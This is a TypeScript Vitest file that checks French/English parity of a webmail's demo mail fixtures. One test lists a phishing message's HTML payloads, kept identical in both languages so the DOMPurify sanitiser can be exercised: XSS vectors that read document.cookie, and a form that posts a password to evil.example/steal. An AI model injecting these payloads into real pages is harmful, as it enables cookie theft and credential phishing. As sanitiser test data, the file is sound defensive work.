/**
 * Parité fr/en des fixtures démo (server/lib/mail/mock-fixtures.ts + fixtures/{fr,en}.ts) :
 * même structure (dossiers, indicateurs, pièces jointes, en-têtes spéciaux) des deux côtés,
 * seul le texte change — et aucun français ne doit rester dans le jeu anglais (à l'exception
 * du payload de hameçonnage, qui reste volontairement identique dans les deux langues : c'est
 * l'attaque qui exerce le sanitiseur DOMPurify, pas sa langue).
 */
import { describe, expect, it } from 'vitest'
import { devFixtures } from '../../../server/lib/mail/mock-fixtures'
import type { FixtureMessage } from '../../../server/lib/mail/mock-fixtures'

const NOW = Date.UTC(2026, 8, 19, 12, 0, 0)
const ME = 'Dev Webmail <dev@universite.example>'

/** Marqueur du message de hameçonnage (contrat : payload HTML identique fr/en). */
const PHISHING_FROM_MARKER = 'compta@factures-urgentes.example'

/**
 * Mots/expressions français distinctifs de fr.ts, absents (hors payload de hameçonnage et
 * noms propres partagés, ex. « Léa », « Inès ») de tout texte visible du jeu anglais.
 */
const FRENCH_MARKERS = [
  'bonjour', 'bonne journée', 'merci', 'réunion', 'présence', 'rendu du projet',
  'vendredi', 'paramètres dynamiques', 'stagiaire', 'printemps', 'indisponible',
  'scolarité', 'portes ouvertes', 'département', 'cafétéria',
  'jeudi', 'lundi', 'mardi', 'samedi', 'lettre du campus', 'rentrée', 'événements',
  'impayée', 'action requise', 'suspendu', 'payer maintenant', 'relevé de notes', 'semestre',
  'pièce jointe', 'maquette', 'intégré', 'voici', 'sujet très long', 'tronque',
  'mise en page', 'la sortie', 'musée', 'déjeuner', 'confirmer la lecture',
  'idées', 'ancienne notification', 'supprimée', 'étape', 'projet tutoré',
  'liste de diffusion', 'carte de visite', 'carnet d’adresses', 'cahier des charges',
  'archives du semestre', 'documents du semestre', 'gagné', 'cliquez ici', 'auprès',
  'service informatique', 'comptabilité', 'université exemple', 'enseignante',
]

function frenchMarkersIn(text: string): string[] {
  const lower = text.toLowerCase()
  return FRENCH_MARKERS.filter(marker => lower.includes(marker))
}

describe('devFixtures — parité fr/en', () => {
  const fr = devFixtures(NOW, ME, 'fr')
  const en = devFixtures(NOW, ME, 'en')

  it('même nombre total de messages', () => {
    expect(en.length).toBe(fr.length)
    expect(fr.length).toBeGreaterThan(60)
  })

  it('même nombre de messages par dossier', () => {
    const countByFolder = (list: FixtureMessage[]): Record<string, number> => {
      const counts: Record<string, number> = {}
      for (const m of list) counts[m.folder] = (counts[m.folder] ?? 0) + 1
      return counts
    }
    expect(countByFolder(en)).toEqual(countByFolder(fr))
  })

  it('structure identique message par message (date, seen, flagged, pièces jointes, en-têtes)', () => {
    expect(en.length).toBe(fr.length)
    for (let i = 0; i < fr.length; i++) {
      const f = fr[i]!
      const e = en[i]!
      expect(e.folder, `message ${i} folder`).toBe(f.folder)
      expect(e.date.getTime(), `message ${i} date`).toBe(f.date.getTime())
      expect(e.seen, `message ${i} seen`).toBe(f.seen)
      expect(e.flagged, `message ${i} flagged`).toBe(f.flagged)
      expect(!!e.draft, `message ${i} draft`).toBe(!!f.draft)
      expect(!!e.html, `message ${i} has html part`).toBe(!!f.html)
      expect((e.attachments ?? []).length, `message ${i} attachment count`).toBe((f.attachments ?? []).length)
      expect((e.attachments ?? []).map(a => a.contentType), `message ${i} attachment types`).toEqual((f.attachments ?? []).map(a => a.contentType))
      expect((e.attachments ?? []).map(a => !!a.cid), `message ${i} inline attachments`).toEqual((f.attachments ?? []).map(a => !!a.cid))
      expect(Object.keys(e.headers ?? {}).sort(), `message ${i} header keys`).toEqual(Object.keys(f.headers ?? {}).sort())
    }
  })

  it('en-têtes spéciaux présents des deux côtés (List-Post, Disposition-Notification-To)', () => {
    for (const list of [fr, en]) {
      expect(list.some(m => m.headers?.['List-Post'])).toBe(true)
      expect(list.some(m => m.headers?.['Disposition-Notification-To'])).toBe(true)
    }
  })

  it('le message de hameçonnage garde le même payload HTML malveillant dans les deux langues', () => {
    const phishingFr = fr.find(m => m.from.includes(PHISHING_FROM_MARKER))
    const phishingEn = en.find(m => m.from.includes(PHISHING_FROM_MARKER))
    expect(phishingFr?.html).toBeDefined()
    // Les textes visibles sont traduits, mais chaque construction dangereuse doit se
    // retrouver à l'identique dans les deux langues : c'est ce que l'assainisseur doit neutraliser.
    const attacks = [
      '<img src=x onerror="alert(1)">',
      'href="javascript:alert(document.cookie)"',
      '<svg><script>alert(2)</script></svg>',
      '<iframe src="https://evil.example/"></iframe>',
      '<form action="https://evil.example/steal"><input name="password"></form>',
      '<style>body{background:url("https://evil.example/p.gif")}</style>',
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    ]
    for (const attack of attacks) {
      expect(phishingFr?.html).toContain(attack)
      expect(phishingEn?.html).toContain(attack)
    }
    // Objet et corps traduits.
    expect(phishingEn?.subject).not.toBe(phishingFr?.subject)
    expect(phishingEn?.html).toContain('Your account will be suspended.')
  })

  it('le jeu anglais ne contient aucun texte français résiduel (hors payload de hameçonnage)', () => {
    const offenders: string[] = []
    for (const [i, m] of en.entries()) {
      const isPhishing = m.from.includes(PHISHING_FROM_MARKER)
      const fields: Array<[string, string | undefined]> = [
        ['subject', m.subject],
        ['text', m.text],
        ...(isPhishing ? [] : [['html', m.html] as [string, string | undefined]]),
      ]
      for (const [field, value] of fields) {
        if (!value) continue
        const hits = frenchMarkersIn(value)
        if (hits.length) offenders.push(`#${i} ${field}: ${hits.join(', ')} — "${value.slice(0, 80)}"`)
      }
    }
    expect(offenders, offenders.join('\n')).toEqual([])
  })

  it('les adresses gardent le domaine universite.example dans les deux langues', () => {
    for (const list of [fr, en]) {
      for (const m of list) {
        if (m.from.includes('@') && !m.from.includes('loterie.example') && !m.from.includes('factures-urgentes.example')) {
          expect(m.from).toMatch(/@universite\.example>?$/)
        }
      }
    }
  })
})
